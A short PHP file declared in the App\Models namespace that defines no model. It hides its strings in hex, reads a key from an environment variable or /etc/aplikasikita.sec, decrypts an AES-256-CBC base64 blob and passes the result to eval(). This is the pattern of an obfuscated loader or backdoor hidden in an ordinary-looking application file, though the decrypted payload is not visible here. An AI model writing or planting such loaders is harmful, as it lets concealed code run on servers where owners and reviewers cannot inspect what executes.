<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('230zkctGs1ravBhTm2QICQ==');

$c=base64_decode(

'P5LGustH9/FSwz0YpxKka8kREWULy16n3TFmOU4BgK8oxcoTWP7nXdv6pATBA+Qci0OViw0YLBzY' .
'Hdkf3atxznaqql+WicRsyHMfe+LhX89ENgRLi97HjsNhyXc+D82ZxrwmbTEBQKQIWqvOb+FJ5s0I' .
'oPYa3vigZXW0OJX1jS9Gqy9NGOHktJoXls8gHlbLKSgEai9G5xFXJ7N3tnBKVH3DxDo0vhQ3WmXW' .
'eJcYfBvx/9bXzuR5qP9WLW0BHtgsEqLvX7xZJvYcjHYP05WinKW9yydM92tva6mKzau8u/hcmTEd' .
'xmz3rnk1eeHVMEbDv6s+lBSa3AtI0DkBdZq2RqpiHd97quvk/JbhnuHnTap2roldMfdQLzglhsxs' .
'yTxzEvfn/857kG2qaYR+quuUVH7jIiv+K+gZt+Y99l2T8XK8EhGQyeZu76x08/PzifSoZ95QtO2x' .
'bL0lZChdUlXs2Jo/PTV2g2qZ03S0z7enRBdguPKNYa3mgSxiyNuVtXRNh7LMoJ7WlvYKu5CAEf/u' .
'acPHUDf2q9GlNtINkmxEbEoro9ZfiQ+FcONMSpyg8YFH6mAgITXF/YK7VUVxJFgEtdOcm3tafI1W' .
'1OiH09l2yDtT2xhHXQ6Pg1AJGlCbtu1rX38uyaEOfwsu+pwT9IX8Aiqimk+Y5kGSQwdgLYYYedRj' .
'aK4KnQri8wkCZFU9ZNk+IloF6PjWtq8wrgnzMx7WOkbeh2of+CB3LMcSS6rO7vczTE62FJlnViVG' .
'y7kts2jpkdiKg7mCBbs/Rqbo+lfQOJTxKo13GJ8nGoBTzuAZViuZLWQzwjvSM546OI6HOK76LRwL' .
'4WW7AFj1xTFx+RUZkQbrRN0b3Nxsp8CXoAJyQdSsKFGHyxHGVDyMgNnyRu+I'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

